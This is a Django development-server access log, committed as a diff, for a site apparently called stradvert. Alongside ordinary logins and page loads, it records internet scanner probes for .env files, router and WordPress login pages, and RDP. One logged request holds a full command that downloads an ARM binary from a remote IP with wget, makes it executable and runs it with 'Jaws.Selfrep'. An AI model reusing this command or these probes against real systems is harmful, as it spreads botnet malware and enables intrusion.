+[29/Mar/2023 01:06:11] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:06:23] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:06:46] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:07:53] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:08:02] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:08:30] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:08:39] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:08:44] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:08:52] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:08:56] "GET /login/ HTTP/1.1" 200 5163
+Forbidden (CSRF cookie not set.): /login/
+[29/Mar/2023 01:09:04] "POST /login/ HTTP/1.1" 403 2870
+[29/Mar/2023 01:09:04] "GET /favicon.ico HTTP/1.1" 302 0
+[29/Mar/2023 01:09:05] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[29/Mar/2023 01:09:40] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:09:47] "GET / HTTP/1.1" 200 3497
+/var/www/stradvert/stradvert/core/settings.py changed, reloading.
+Watching for file changes with StatReloader
+Performing system checks...
+
+System check identified no issues (0 silenced).
+March 29, 2023 - 01:14:42
+Django version 3.2.6, using settings 'core.settings'
+Starting development server at http://0.0.0.0:80/
+Quit the server with CONTROL-C.
+[29/Mar/2023 01:14:46] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:14:52] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:14:59] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:15:03] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:15:08] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:15:10] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:15:33] "POST /login/ HTTP/1.1" 302 0
+[29/Mar/2023 01:15:34] "GET /dashboard HTTP/1.1" 200 13215
+[29/Mar/2023 01:16:02] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:16:33] "GET /dashboard HTTP/1.1" 200 13215
+[29/Mar/2023 01:16:36] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:16:40] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:16:46] "GET /static/assets/img/theme/user.png HTTP/1.1" 200 24784
+[29/Mar/2023 01:16:50] "GET /admin HTTP/1.1" 302 0
+[29/Mar/2023 01:16:51] "GET /admin/ HTTP/1.1" 200 3326
+[29/Mar/2023 01:16:51] "GET /static/admin/css/nav_sidebar.css HTTP/1.1" 200 2271
+[29/Mar/2023 01:16:52] "GET /static/admin/css/base.css HTTP/1.1" 200 19513
+[29/Mar/2023 01:16:52] "GET /static/admin/css/responsive.css HTTP/1.1" 200 18545
+[29/Mar/2023 01:16:52] "GET /static/admin/css/dashboard.css HTTP/1.1" 200 380
+[29/Mar/2023 01:16:52] "GET /static/admin/css/fonts.css HTTP/1.1" 200 423
+[29/Mar/2023 01:16:52] "GET /static/admin/js/nav_sidebar.js HTTP/1.1" 200 1360
+[29/Mar/2023 01:16:53] "GET /static/admin/img/icon-addlink.svg HTTP/1.1" 200 331
+[29/Mar/2023 01:16:53] "GET /static/admin/img/icon-changelink.svg HTTP/1.1" 200 380
+[29/Mar/2023 01:16:53] "GET /static/admin/fonts/Roboto-Bold-webfont.woff HTTP/1.1" 200 86184
+[29/Mar/2023 01:16:53] "GET /static/admin/fonts/Roboto-Light-webfont.woff HTTP/1.1" 200 85692
+[29/Mar/2023 01:16:54] "GET /static/admin/fonts/Roboto-Regular-webfont.woff HTTP/1.1" 200 85876
+[29/Mar/2023 01:16:55] "GET /favicon.ico HTTP/1.1" 200 3382
+[29/Mar/2023 01:16:58] "GET /dashboard HTTP/1.1" 200 13215
+[29/Mar/2023 01:17:23] "GET /login/ HTTP/1.1" 301 0
+[29/Mar/2023 01:17:24] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:17:59] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[29/Mar/2023 01:24:11] "GET /robots.txt HTTP/1.1" 200 3382
+[29/Mar/2023 01:24:11] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:24:36] "POST /login/ HTTP/1.1" 302 0
+[29/Mar/2023 01:24:36] "GET /dashboard HTTP/1.1" 200 13222
+[29/Mar/2023 01:25:05] "GET /profile.html HTTP/1.1" 200 8948
+[29/Mar/2023 01:25:16] "GET /dashboard HTTP/1.1" 200 13222
+[29/Mar/2023 01:26:30] "GET /logout/ HTTP/1.1" 302 0
+[29/Mar/2023 01:26:49] "GET /dashboard HTTP/1.1" 302 0
+[29/Mar/2023 01:26:50] "GET /login/?next=/dashboard HTTP/1.1" 200 5163
+[29/Mar/2023 01:27:28] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:27:34] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:27:45] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:27:45] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:27:47] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[29/Mar/2023 01:27:49] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[29/Mar/2023 01:27:52] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[29/Mar/2023 01:27:53] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:27:53] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[29/Mar/2023 01:27:53] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[29/Mar/2023 01:27:53] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[29/Mar/2023 01:27:53] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[29/Mar/2023 01:27:53] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[29/Mar/2023 01:27:53] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[29/Mar/2023 01:27:53] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[29/Mar/2023 01:29:41] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:41:25] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:41:54] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 01:46:51] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[29/Mar/2023 01:47:00] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:47:01] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[29/Mar/2023 01:47:01] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[29/Mar/2023 01:47:01] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[29/Mar/2023 01:47:01] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[29/Mar/2023 01:47:01] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[29/Mar/2023 01:47:01] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[29/Mar/2023 01:47:01] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[29/Mar/2023 01:47:01] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[29/Mar/2023 01:47:01] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[29/Mar/2023 01:47:01] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[29/Mar/2023 01:47:01] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[29/Mar/2023 01:47:01] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[29/Mar/2023 01:47:02] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[29/Mar/2023 01:47:11] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 01:56:01] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 02:26:00] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 02:34:47] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 02:48:36] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[29/Mar/2023 03:25:11] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 03:25:13] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 03:25:15] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 304 0
+[29/Mar/2023 03:26:18] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 03:26:18] "GET /static/str-logo.png HTTP/1.1" 304 0
+[29/Mar/2023 03:27:04] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 03:27:08] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 04:13:41] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 04:16:38] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 04:16:38] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 04:16:38] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[29/Mar/2023 04:16:39] "GET /favicon.ico HTTP/1.1" 302 0
+[29/Mar/2023 04:16:39] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[29/Mar/2023 04:28:02] code 400, message Bad request version ('Ý%d1\x17¦%nÅ')
+[29/Mar/2023 04:28:02] "ÉÑ¦®lM/	p#î*5#]ÇR:È/¸ÍZû¤fÒÎ³¡»ü Ý%d1¦%nÅ" 400 -
+[29/Mar/2023 04:28:11] code 400, message Bad HTTP/0.9 request type ('\x10')
+[29/Mar/2023 04:28:11] "   BBBBºÁ«DAAA" 400 -
+[29/Mar/2023 04:42:28] "GET /.env HTTP/1.1" 301 0
+[29/Mar/2023 04:42:28] code 400, message Bad request version (':\x17´©\x80{\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+[29/Mar/2023 04:42:28] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[29/Mar/2023 04:52:20] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 04:54:05] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 04:54:26] "GET /favicon.ico HTTP/1.1" 301 0
+[29/Mar/2023 04:55:37] "GET /geoserver/web/ HTTP/1.1" 301 0
+[29/Mar/2023 05:09:09] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 05:20:30] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 05:23:18] "GET /assets/jQuery-File-Upload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 301 0
+[29/Mar/2023 05:23:28] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 05:23:29] "GET //static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[29/Mar/2023 05:23:29] "GET //static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[29/Mar/2023 05:23:29] "GET //static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[29/Mar/2023 05:23:29] "GET //static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[29/Mar/2023 05:23:29] "GET //static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[29/Mar/2023 05:23:29] "GET /assets/jQuery-File-Upload/server/php/index.php?file=tf2rghf.jpg HTTP/1.1" 302 0
+[29/Mar/2023 05:26:54] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: '127.0.0.1'. You may need to add '127.0.0.1' to ALLOWED_HOSTS.
+Bad Request: /v1/agent/self
+[29/Mar/2023 06:15:46] "GET /v1/agent/self HTTP/1.1" 400 62987
+[29/Mar/2023 06:56:35] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 07:23:43] "GET /wp-login.php HTTP/1.1" 301 0
+[29/Mar/2023 07:23:44] "GET /wp-login.php HTTP/1.1" 302 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[29/Mar/2023 07:25:04] "GET / HTTP/1.1" 400 64841
+[29/Mar/2023 07:25:04] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 07:25:04] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 07:25:05] "GET /Public/home/js/check.js HTTP/1.1" 302 0
+[29/Mar/2023 07:25:05] "GET /Public/home/js/check.js HTTP/1.1" 302 0
+[29/Mar/2023 07:25:05] "GET /login/?next=/Public/home/js/check.js HTTP/1.1" 200 5163
+[29/Mar/2023 07:25:06] "GET /login/?next=/Public/home/js/check.js HTTP/1.1" 200 5163
+[29/Mar/2023 07:25:07] "GET /static/admin/javascript/hetong.js HTTP/1.1" 404 1934
+[29/Mar/2023 07:25:07] "GET /static/admin/javascript/hetong.js HTTP/1.1" 404 1934
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /Public/home/js/check.js
+[29/Mar/2023 07:25:34] "GET /Public/home/js/check.js HTTP/1.1" 400 65098
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/django/contrib/staticfiles/handlers.py", line 53, in get_response
+    return self.serve(request)
+  File "/usr/local/lib/python3.10/dist-packages/django/contrib/staticfiles/handlers.py", line 49, in serve
+    return serve(request, self.file_path(request.path), insecure=True)
+  File "/usr/local/lib/python3.10/dist-packages/django/contrib/staticfiles/views.py", line 37, in serve
+    raise Http404("'%s' could not be found" % path)
+django.http.response.Http404: 'admin/javascript/hetong.js' could not be found
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.10/wsgiref/handlers.py", line 137, in run
+    self.result = application(self.environ, self.start_response)
+  File "/usr/local/lib/python3.10/dist-packages/django/contrib/staticfiles/handlers.py", line 77, in __call__
+    return super().__call__(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/handlers/wsgi.py", line 133, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.10/dist-packages/django/contrib/staticfiles/handlers.py", line 55, in get_response
+    return response_for_exception(request, e)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/handlers/exception.py", line 57, in response_for_exception
+    response = debug.technical_404_response(request, exc)
+  File "/usr/local/lib/python3.10/dist-packages/django/views/debug.py", line 549, in technical_404_response
+    return HttpResponseNotFound(t.render(c), content_type='text/html')
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 170, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 162, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 938, in render
+    bit = node.render_annotated(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 905, in render_annotated
+    return self.render(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 988, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 671, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 796, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 858, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.10/dist-packages/django/http/request.py", line 236, in build_absolute_uri
+    location = self._current_scheme_host + location
+  File "/usr/local/lib/python3.10/dist-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.10/dist-packages/django/http/request.py", line 246, in _current_scheme_host
+    return '{}://{}'.format(self.scheme, self.get_host())
+  File "/usr/local/lib/python3.10/dist-packages/django/http/request.py", line 149, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+[29/Mar/2023 07:25:36] "GET /static/admin/javascript/hetong.js HTTP/1.1" 500 59
+[29/Mar/2023 07:29:48] "GET / HTTP/1.1" 200 3497
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[29/Mar/2023 07:29:48] "GET / HTTP/1.1" 400 64846
+[29/Mar/2023 07:29:48] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 07:29:49] "GET /Public/home/js/check.js HTTP/1.1" 302 0
+[29/Mar/2023 07:29:49] "GET /Public/home/js/check.js HTTP/1.1" 302 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /Public/home/js/check.js
+[29/Mar/2023 07:29:49] "GET /Public/home/js/check.js HTTP/1.1" 400 65095
+[29/Mar/2023 07:29:49] "GET /login/?next=/Public/home/js/check.js HTTP/1.1" 200 5163
+[29/Mar/2023 07:29:49] "GET /login/?next=/Public/home/js/check.js HTTP/1.1" 200 5163
+[29/Mar/2023 07:29:50] "GET /static/admin/javascript/hetong.js HTTP/1.1" 404 1934
+[29/Mar/2023 07:29:51] "GET /static/admin/javascript/hetong.js HTTP/1.1" 404 1934
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/django/contrib/staticfiles/handlers.py", line 53, in get_response
+    return self.serve(request)
+  File "/usr/local/lib/python3.10/dist-packages/django/contrib/staticfiles/handlers.py", line 49, in serve
+    return serve(request, self.file_path(request.path), insecure=True)
+  File "/usr/local/lib/python3.10/dist-packages/django/contrib/staticfiles/views.py", line 37, in serve
+    raise Http404("'%s' could not be found" % path)
+django.http.response.Http404: 'admin/javascript/hetong.js' could not be found
+
+During handling of the above exception, another exception occurred:
+
+Traceback (most recent call last):
+  File "/usr/lib/python3.10/wsgiref/handlers.py", line 137, in run
+    self.result = application(self.environ, self.start_response)
+  File "/usr/local/lib/python3.10/dist-packages/django/contrib/staticfiles/handlers.py", line 77, in __call__
+    return super().__call__(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/handlers/wsgi.py", line 133, in __call__
+    response = self.get_response(request)
+  File "/usr/local/lib/python3.10/dist-packages/django/contrib/staticfiles/handlers.py", line 55, in get_response
+    return response_for_exception(request, e)
+  File "/usr/local/lib/python3.10/dist-packages/django/core/handlers/exception.py", line 57, in response_for_exception
+    response = debug.technical_404_response(request, exc)
+  File "/usr/local/lib/python3.10/dist-packages/django/views/debug.py", line 549, in technical_404_response
+    return HttpResponseNotFound(t.render(c), content_type='text/html')
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 170, in render
+    return self._render(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 162, in _render
+    return self.nodelist.render(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 938, in render
+    bit = node.render_annotated(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 905, in render_annotated
+    return self.render(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 988, in render
+    output = self.filter_expression.resolve(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 671, in resolve
+    obj = self.var.resolve(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 796, in resolve
+    value = self._resolve_lookup(context)
+  File "/usr/local/lib/python3.10/dist-packages/django/template/base.py", line 858, in _resolve_lookup
+    current = current()
+  File "/usr/local/lib/python3.10/dist-packages/django/http/request.py", line 236, in build_absolute_uri
+    location = self._current_scheme_host + location
+  File "/usr/local/lib/python3.10/dist-packages/django/utils/functional.py", line 48, in __get__
+    res = instance.__dict__[self.name] = self.func(instance)
+  File "/usr/local/lib/python3.10/dist-packages/django/http/request.py", line 246, in _current_scheme_host
+    return '{}://{}'.format(self.scheme, self.get_host())
+  File "/usr/local/lib/python3.10/dist-packages/django/http/request.py", line 149, in get_host
+    raise DisallowedHost(msg)
+django.core.exceptions.DisallowedHost: Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+[29/Mar/2023 07:29:51] "GET /static/admin/javascript/hetong.js HTTP/1.1" 500 59
+[29/Mar/2023 07:47:23] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 07:56:03] code 400, message Bad request syntax ('GET /shell?cd+/tmp;+wget+http:/\\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1')
+[29/Mar/2023 07:56:03] "GET /shell?cd+/tmp;+wget+http:/\/196.196.196.2/YourName/BinName.arm;+chmod+777+BinName.arm;+./BinName.arm Jaws.Selfrep;rm+-rf+BinName.arm HTTP/1.1" 400 -
+[29/Mar/2023 08:07:25] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 08:11:34] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 08:12:40] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 08:12:40] "GET /static/str-logo.png HTTP/1.1" 304 0
+[29/Mar/2023 08:12:40] "GET /favicon.ico HTTP/1.1" 302 0
+[29/Mar/2023 08:12:41] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[29/Mar/2023 08:16:09] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 08:16:09] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 08:19:10] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 08:41:16] "GET /portal/redlion HTTP/1.1" 301 0
+[29/Mar/2023 08:54:43] "GET /actuator/health HTTP/1.1" 301 0
+[29/Mar/2023 09:18:23] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 09:24:08] "GET /hudson HTTP/1.1" 301 0
+[29/Mar/2023 09:25:57] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 09:25:57] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 09:25:57] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[29/Mar/2023 09:25:57] "GET /favicon.ico HTTP/1.1" 302 0
+[29/Mar/2023 09:25:57] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[29/Mar/2023 10:03:06] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 10:03:07] "GET /favicon.ico HTTP/1.1" 302 0
+[29/Mar/2023 10:03:07] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[29/Mar/2023 10:03:18] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 10:03:18] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[29/Mar/2023 10:03:18] "GET /favicon.ico HTTP/1.1" 302 0
+[29/Mar/2023 10:03:18] "GET /login/?next=/favicon.ico HTTP/1.1" 200 5163
+[29/Mar/2023 11:08:53] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 11:08:55] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 11:38:51,263] - Broken pipe from ('167.248.133.52', 58424)
+
+[29/Mar/2023 11:38:52] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 11:38:52] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 11:38:52] code 505, message Invalid HTTP version (2.0)
+[29/Mar/2023 11:38:52] "PRI * HTTP/2.0" 505 -
+[29/Mar/2023 12:01:41] "GET /.env HTTP/1.1" 301 0
+[29/Mar/2023 12:01:41] code 400, message Bad request version ('\x95\x00b\x13\x02\x13\x03\x13\x01À,À0À+À/Ì©Ì¨\x00£\x00\x9f\x00¢\x00\x9eÌªÀ¯À\xadÀ$À(À')
+[29/Mar/2023 12:01:41] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[29/Mar/2023 12:22:07] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[29/Mar/2023 12:46:13] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 13:33:30] "GET /static/assets/vendor/jquery/dist/jquery.min.js HTTP/1.1" 200 88145
+[29/Mar/2023 13:33:30] "GET /static/assets/vendor/jquery.scrollbar/jquery.scrollbar.min.js HTTP/1.1" 200 13026
+[29/Mar/2023 13:33:30] "GET /static/assets/vendor/nucleo/css/nucleo.css HTTP/1.1" 200 9015
+[29/Mar/2023 13:33:30] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[29/Mar/2023 13:33:30] "GET /static/assets/js/argon.js?v=1.2.0 HTTP/1.1" 200 21706
+[29/Mar/2023 13:33:30] "GET /static/assets/img/theme/str-logo.png HTTP/1.1" 200 24457
+[29/Mar/2023 13:33:30] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[29/Mar/2023 13:33:30] "GET /static/assets/vendor/jquery-scroll-lock/dist/jquery-scrollLock.min.js HTTP/1.1" 200 4587
+[29/Mar/2023 13:33:31] "GET /static/assets/vendor/bootstrap/dist/js/bootstrap.bundle.min.js HTTP/1.1" 200 80650
+[29/Mar/2023 13:33:31] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[29/Mar/2023 13:33:31] "GET /static/assets/vendor/nucleo/fonts/nucleo-icons.woff2 HTTP/1.1" 200 8580
+[29/Mar/2023 13:33:31] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
+[29/Mar/2023 13:33:33] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 13:33:34] "GET /static/str-logo.png HTTP/1.1" 200 24457
+[29/Mar/2023 13:41:20] code 400, message Bad request version ('À\x14À')
+[29/Mar/2023 13:41:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[29/Mar/2023 13:44:13] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[29/Mar/2023 13:44:13] "GET /static/assets/img/brand/str.jpeg HTTP/1.1" 200 492705
+[29/Mar/2023 13:44:27] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 13:44:43] "GET /login/ HTTP/1.1" 200 5163
+[29/Mar/2023 14:19:19] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 14:19:19] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 14:19:20] code 400, message Bad request syntax ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03')
+[29/Mar/2023 14:19:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[29/Mar/2023 14:19:20] "GET /favicon.ico HTTP/1.1" 301 0
+[29/Mar/2023 14:19:20] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x91¡\x0f0\x82\x01\x1aJä\x9a@ßüËüg£_\x86mÒµ\x9eèË\xad¤\x80fYøè\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[29/Mar/2023 14:19:20] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[29/Mar/2023 14:19:21] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00{\x01\x00\x00w\x03\x03O"Ã4¿w6\x99L\x01\x11\x9e$¡ùñæ\x8c\x83=MéÄí(\x02Â&a/rM\x00\x00\x1aÀ/À+À\x11À\x07À\x13À')
+[29/Mar/2023 14:19:21] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[29/Mar/2023 14:19:21] "GET /robots.txt HTTP/1.1" 301 0
+[29/Mar/2023 14:56:59] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 15:03:04] "POST /boaform/admin/formLogin HTTP/1.1" 301 0
+[29/Mar/2023 15:09:59] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 15:13:58] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[29/Mar/2023 15:13:58] "  /*à     Cookie: mstshash=Administr" 400 -
+[29/Mar/2023 15:14:40] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+[29/Mar/2023 15:14:40] "  /*à     Cookie: mstshash=Administr" 400 -
+[29/Mar/2023 16:10:25] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 301 0
+[29/Mar/2023 16:10:33] code 400, message Bad request version ('À\x13À')
+[29/Mar/2023 16:10:33] You're accessing the development server over HTTPS, but it only supports HTTP.
+
+[29/Mar/2023 16:15:57] "GET / HTTP/1.1" 301 0
+Invalid HTTP_HOST header: 'www.stradvert.com'. You may need to add 'www.stradvert.com' to ALLOWED_HOSTS.
+Bad Request: /
+[29/Mar/2023 16:54:30] "GET / HTTP/1.1" 400 64766
+[29/Mar/2023 16:55:52] "GET /robots.txt HTTP/1.1" 301 0
+[29/Mar/2023 16:55:53] "GET / HTTP/1.1" 301 0
+[29/Mar/2023 16:55:53] "GET / HTTP/1.1" 200 3497
+[29/Mar/2023 16:55:56] "GET /static/assets/vendor/js-cookie/js.cookie.js HTTP/1.1" 200 3886
+[29/Mar/2023 16:55:56] "GET /static/assets/vendor/@fortawesome/fontawesome-free/css/all.min.css HTTP/1.1" 200 57180
+[29/Mar/2023 16:55:56] "GET /static/assets/css/argon.css?v=1.2.0 HTTP/1.1" 200 455973
